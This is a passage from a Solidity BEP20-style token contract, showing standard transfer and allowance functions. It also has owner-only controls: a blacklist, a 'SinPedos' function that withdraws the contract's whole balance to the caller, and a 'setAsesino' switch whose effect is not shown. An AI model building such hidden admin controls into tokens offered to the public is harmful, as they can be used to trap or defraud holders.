1257         onlyAuth
1258     {
1259         _blacklist[toRemove] = false;
1260     }
1261 
1262     function SinPedos() public onlyAuth {
1263         (bool sent, ) = msg.sender.call{value: (address(this).balance)}("");
1264         require(sent);
1265     }
1266 
1267     function setAsesino(bool isAsesino) public onlyAuth {
1268         asesino = isAsesino;
1269     }
1270 
1271     receive() external payable {}
1272 
1273     fallback() external payable {}
1274 
1275     function getOwner() external view override returns (address) {
1276         return owner();
1277     }
1278 
1279     function name() external pure override returns (string memory) {
1280         return _name;
1281     }
1282 
1283     function symbol() external pure override returns (string memory) {
1284         return _symbol;
1285     }
1286 
1287     function decimals() external pure override returns (uint8) {
1288         return _decimals;
1289     }
1290 
1291     function totalSupply() external view override returns (uint256) {
1292         return _circulatingSupply;
1293     }
1294 
1295     function balanceOf(address account)
1296         external
1297         view
1298         override
1299         returns (uint256)
1300     {
1301         return _balances[account];
1302     }
1303 
1304     function transfer(address recipient, uint256 amount)
1305         external
1306         override
1307         returns (bool)
1308     {
1309         _transfer(msg.sender, recipient, amount);
1310         return true;
1311     }
1312 
1313     function allowance(address _owner, address spender)
1314         external
1315         view
1316         override
1317         returns (uint256)
1318     {
1319         return _allowances[_owner][spender];
1320     }
1321 
1322     function approve(address spender, uint256 amount)
1323         external
1324         override
1325         returns (bool)
1326     {
1327         _approve(msg.sender, spender, amount);
1328         return true;
1329     }
1330 
1331     function _approve(
1332         address _owner,
1333         address spender,
1334         uint256 amount
1335     ) private {
1336         require(_owner != address(0), "Approve from zero");
1337         require(spender != address(0), "Approve to zero");
1338 
1339         _allowances[_owner][spender] = amount;
1340         emit Approval(_owner, spender, amount);
1341     }
1342 
1343     function transferFrom(
1344         address sender,
1345         address recipient,
1346         uint256 amount
1347     ) external override returns (bool) {
1348         _transfer(sender, recipient, amount);
1349 
1350         uint256 currentAllowance = _allowances[sender][msg.sender];
1351         require(currentAllowance >= amount, "Transfer > allowance");
1352 
1353         _approve(sender, msg.sender, currentAllowance - amount);
1354         return true;
1355     }
1356 
1357     function increaseAllowance(address spender, uint256 addedValue)
1358         external
1359         returns (bool)
1360     {
1361         _approve(
1362             msg.sender,
1363             spender,
1364             _allowances[msg.sender][spender] + addedValue
1365         );
1366         return true;
1367     }
1368 
1369     function decreaseAllowance(address spender, uint256 subtractedValue)
1370         external
1371         returns (bool)
1372     {
1373         uint256 currentAllowance = _allowances[msg.sender][spender];
1374         require(currentAllowance >= subtractedValue, "<0 allowance");
1375 
1376         _approve(msg.sender, spender, currentAllowance - subtractedValue);
1377         return true;
1378     }
1379 }